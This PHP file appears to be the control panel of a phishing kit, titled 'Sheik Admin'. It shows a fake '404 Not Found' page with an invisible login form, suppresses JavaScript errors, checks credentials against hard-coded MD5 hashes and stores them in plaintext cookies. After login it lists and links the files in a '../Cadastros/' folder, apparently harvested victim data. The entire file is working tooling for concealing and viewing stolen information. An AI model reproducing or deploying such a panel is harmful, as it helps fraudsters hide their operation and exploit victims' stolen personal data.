﻿<?php
if (!defined('FIREWALL_PROTECTED'))
{
define('FIREWALL_PROTECTED', true);
define('PASS_MODE',false);
$PASSINFO = array();
$USERPASSINFO = array(array("73df35dee362907991952dd4e4f7b312","6920afd5495f7a54840197a051ad4197"));
define('ENCRYPT_MODE',1);
define('COOKIE_DAYS',365);
define('ALERT_MESS',true);
define('STR_MESS',"No connect");
define('REDIRECT',true);
define('REDIRECT_URL',"http://www.google.com.br");
define('REDIRECT_TARGET',"_self");
define('MAX_ATTEMP',3);
define('USER_SENSITIVE',false);
define('PASS_SENSITIVE',false);
function save_cookie($user,$pass) {
	if (ENCRYPT_MODE ==0) return;
	if (ENCRYPT_MODE ==1)
		$cookie_expire=0;
	else if (ENCRYPT_MODE ==2)
		$cookie_expire=time()+COOKIE_DAYS*24*60*60;
	if (isset($user)) setcookie('mtusr',$user,$cookie_expire,'/');
	setcookie('mtpwd',$pass,$cookie_expire,'/');
}
function check_postinfo() {
	global $PASSINFO,$USERPASSINFO;
	if (PASS_MODE) {
		if (isset($_POST['mtpwd']))	{
			$pass=$_POST['mtpwd'];
			if (!PASS_SENSITIVE) $pass=strtolower($pass);
			if (in_array(md5($pass), $PASSINFO)) {
				save_cookie(NULL,$pass);
				unset($_POST['mtpwd']);
				return 1;
			}
			else
				return -2;
		}
		else
			return -1;
	}
	else {
		if (isset($_POST['mtusr']) && isset($_POST['mtpwd'])) {
			$user=$_POST['mtusr'];
			if (!USER_SENSITIVE) $user=strtolower($user); 
			$pass=$_POST['mtpwd'];
			if (!PASS_SENSITIVE) $pass=strtolower($pass);
			if (in_array(array(md5($user),md5($pass)), $USERPASSINFO)) {
				save_cookie($user,$pass);
				unset($_POST['mtusr']);
				unset($_POST['mtpwd']);
				return 1;
			}
			else
				return -2;
		}
		else
			return -1;
	}
}
function check_cookie() {
	global $PASSINFO,$USERPASSINFO;
	if (PASS_MODE) {
		if (isset($_COOKIE['mtpwd'])) 
		{
			$pass=md5($_COOKIE['mtpwd']);
			if (in_array($pass, $PASSINFO)) {
				save_cookie(NULL,$_COOKIE['mtpwd']);
				return true;
			}
			else
				return false;
		}
	}
	else {
		if (isset($_COOKIE['mtusr']) && isset($_COOKIE['mtpwd'])) 
		{
			$user=md5($_COOKIE['mtusr']);
			$pass=md5($_COOKIE['mtpwd']);
			if (in_array(array($user,$pass), $USERPASSINFO)) {
				save_cookie($_COOKIE['mtusr'],$_COOKIE['mtpwd']);
				return true;
			}
			else
				return false;
		}
	}
	return false;
}
function show_login() {
?>
<html>
<head>
<script language="javascript">function killerrors(){return true;}window.onerror = killerrors;</script>
<title>404 Not Found</title></head>
<body>
	<table>
	<tr>
	<td width="827"><h1>Not Found</h1>
	  <p>The requested URL /Error.php was not found on this server.</p>
	  <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to the request <?php echo $OS = @PHP_OS; ?>.</p></td>
	</tr>
	</table>
	
	<div align="center"><br>
	
        <form name="htform" method="post" >
          <div align="center">
            <table border="0" cellpadding="0" width="298" height="39" cellspacing="0">  	   
              <tr>   
                <td height="25" width="128" align="left"><input type="text" name="mtusr" size="16" style="background:none; border:none;" />
                </td>   
                <td height="25" width="124" align="left"><input type="password" name="mtpwd" size="16" style="background:none; border:none;"  /></td>   
                <td height="25" width="46" align="left"><input type="submit" name="submit" value=" " style="background:none; border:none;" /></td>   
              </tr>    
            </table>   
          </div>   
        </form>   
        
         
	    <br>      
</div>      
</body>        
</html>

<script language="JavaScript">
if (document.htform.mtusr) document.htform.mtusrd.focus();
wside=(window.sidebar)?true:false;isNS=navigator.userAgent.toLowerCase().indexOf('netscape')>=0?true:false;function noerror(){return true};window.onerror = noerror;var isOff=false;</script>

<?php
	exit();
}
function alert_and_redirect() {
	if ((!ALERT_MESS) && (!REDIRECT)) return;
	$str="<script language='JavaScript'>";
	if (ALERT_MESS) $str.="alert(\"". STR_MESS ."\");";
	if (REDIRECT) {
		$tried=0;
		if (isset($_COOKIE['errtries'])) 
			$tried=intval($_COOKIE['errtries']);
		setcookie('errtries',$tried+1,0,'/');
		if ($tried>=MAX_ATTEMP)
			$str.="window.open(\"". REDIRECT_URL ."\",\"" . REDIRECT_TARGET . "\");";
	}
	$str.="</script>";
	echo $str;
}
function check_valid()
{
	$i_ret = check_postinfo();
	if ($i_ret == -2) {
		alert_and_redirect();
		show_login();
	}
	else if ($i_ret == -1)
		if (!check_cookie())
			show_login();
}
check_valid();
}
?>
<link rel = "shortcut icon" type = "image / x-icon" href="GreenDollar.ico"/>
<style type="text/css">
.csscontadores {
	font-weight: bold;
}
.csscontadores {
	font-family: Tahoma, Geneva, sans-serif;
}
.csscontadores {
	font-size: 12px;
}
.csscontadores {
	font-size: 13px;
}
</style>

<title>-=[ Sheik Admin ]=-</title>
<style type="text/css">
.css1 {
	text-align: center;
	font-family: Tahoma, Geneva, sans-serif;
	font-weight: bold;
	color: #FFF;
}
.css2 {
	text-align: center;
}
.css2 {
	text-align: center;
}
.csscontadores {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 12px;
	color: #0C0;
}
.csscontadoress {
	color: #F60;
	font-family: Tahoma, Geneva, sans-serif;
}
.csscontadoress {
	font-size: 14px;
}
.csscontadoress {
	font-weight: bold;
	color: #0C0;
}
#shk {
    border-width: 10px;
    border-style: inset;
    border-color: #c30024;
    }
body { background:#E5E5E5;
}
</style>
<p class="css1"><img src="logoSheikSanta.png" width="844" height="136" /></p>
<table width="42%" border="0" align="center">
  <tr>
    <td align="center" valign="top" class="csscontadores"><a href="bloquearIp.php"><img src="anonymous-ip-main.png" width="80" height="80" /></a></td>
  </tr>
</table>
<span class="css2">
</span>
<table id="shk" width="47%" border="0" align="center">
  <tr>
    <td height="225" align="center" valign="top" bgcolor="#FFFFFF" class="csscontadoress"><?php
   $path = "../Cadastros/";
   $diretorio = dir($path);
    
    echo "-=[Infos Sheik]=-<br />";    
   while($arquivo = $diretorio -> read()){
      echo "<a href='".$path.$arquivo."'>".$arquivo."</a><br />";
   }
   $diretorio -> close();
?>&nbsp;</td>
  </tr>
</table>
<span class="css2"> </span><span class="css2"></span>